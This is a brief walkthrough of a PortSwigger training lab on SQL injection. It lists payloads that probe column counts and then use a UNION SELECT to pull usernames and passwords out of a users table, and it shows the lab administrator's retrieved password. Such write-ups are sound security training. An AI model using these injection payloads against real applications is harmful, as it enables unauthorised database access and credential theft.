https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

Lab objective: `perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.`

The database contains a different table called `users`, with columns called `username` and `password`.

# Lab: SQL injection UNION attack, retrieving multiple values in a single column

We know that this lab contains a SQL injection vulnerability in the product category filter.

Click product category filter then

1. Find the column number `category=Gifts' ORDER BY 2--`
2. Compatible with string data column `category=-Gifts' UNION SELECT NULL,'A'--` so 2nd columns are OK.
3. To get user_name and password query is `category=-Gifts' UNION SELECT NULL,username||' '||'***'||' '||password FROM users--`

username and password is `administrator *** 5k64bjiqh7aquu67guy9`

To solve the lab login by this